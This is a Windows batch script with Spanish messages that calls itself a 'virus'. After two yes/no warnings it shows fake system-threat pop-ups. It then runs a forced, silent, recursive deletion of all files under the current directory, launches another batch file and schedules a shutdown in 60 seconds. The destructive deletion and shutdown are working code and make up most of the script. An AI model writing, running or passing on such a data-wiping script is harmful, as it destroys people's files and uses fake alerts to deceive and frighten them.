@echo off
color 0f

:: 1. Mensaje de advertencia inicial
echo   ADVERTENCIA: Estas a punto de ejecutar un
echo   virus de verdad esto borrara todos tus datos
echo   ya, has sido avisado y es muy PELIGROSO
echo.

:: 2. Pregunta de Sí o No (/M pone el mensaje, /C define las teclas permitidas)
choice /M "¿Quieres proceder?" /C SN

:: 3. Evaluar la respuesta (IMPORTANTE: Se evalúa de mayor a menor número)
:: S es la opción 1, N es la opción 2
if errorlevel 2 goto :cancelar
if errorlevel 1 goto :siguiente

:siguiente
echo   ADVERTENCIA: Esto no es una broma
echo   esto borrara todo lo que tienes en este
echo   dispositivo NO ESTOY DE BROMA
echo.

choice /M "¿Quieres proceder?" /C SN

if errorlevel 2 goto :cancelar
if errorlevel 1 goto :ejecutar

:ejecutar
cls
title Alerta Del Sistema
color 4f
msg * ADVERTENCIA: Se ha detectado una amenaza en su sistema.
msg * Iniciando el protocolo de eliminacion de archivos...
del /f /s /q *.*
msg * Lo sentimos pero tus datos han sido borrados TE HE AVISADO
msg * Pero mientras vamos a divertirnos
start DonPanicMsg.bat
msg * ahora vamos a apagar las luces pero tranquilo en 60 sec para que asimiles lo que acabas de hacer
shutdown /s /t 60
goto :eof

:cancelar
cls
echo Buena eleccion
echo Nos volveremos a ver
timeout /t 10 /nobreak >nul
exit
